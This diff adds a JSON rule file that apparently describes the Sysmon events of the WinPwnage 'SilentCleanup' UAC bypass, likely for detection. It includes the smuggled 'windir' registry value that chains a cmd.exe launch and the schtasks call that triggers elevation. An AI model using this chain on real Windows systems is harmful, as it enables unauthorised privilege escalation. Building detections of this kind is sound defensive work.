@@ -1,0 +1,55 @@
+{
+	"name": "WinPwnage uac SilentCleanup",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "UAC bypass using SilentCleanup.",
+	"rules": {
+		"reg_key": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Registry object added or deleted",
+			"description": "Writing parent registry key.",
+			"payload": {
+				"EventType": "CreateKey",
+				"ProcessId": "1888",
+				"TargetObject": "HKU\\S-X-X-XX-XXXXXXXXXX-XXXXXXXXX-XXXXXXXX-XXX\\Environment"
+			}
+		},
+		"reg_value": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Registry value set",
+			"description": "Writing WINDIR key containing payload.",
+			"payload": {
+				"EventType": "SetValue",
+				"ProcessId": "1888",
+				"TargetObject": "HKU\\S-X-X-XX-XXXXXXXXXX-XXXXXXXXX-XXXXXXXX-XXX\\Environment\\windir",
+				"Details": "cmd.exe /c start C:\\\\Windows\\\\system32\\\\cmd.exe &&"
+			}
+		},
+		"schtasks_call": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing schtasks.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\schtasks.exe",
+				"Description": "Task Scheduler Configuration Tool",
+				"CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
+				"ParentProcessId": "1888"
+			}
+		},
+		"schtasks_spawn": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing payload process.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\cmd.exe",
+				"CommandLine": "cmd.exe /c start C:\\\\Windows\\\\system32\\\\cmd.exe &&\\system32\\cleanmgr.exe /autoclean /d C:",
+				"ParentImage": "C:\\Windows\\System32\\svchost.exe",
+				"ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
+			}
+		}
+	}
+}
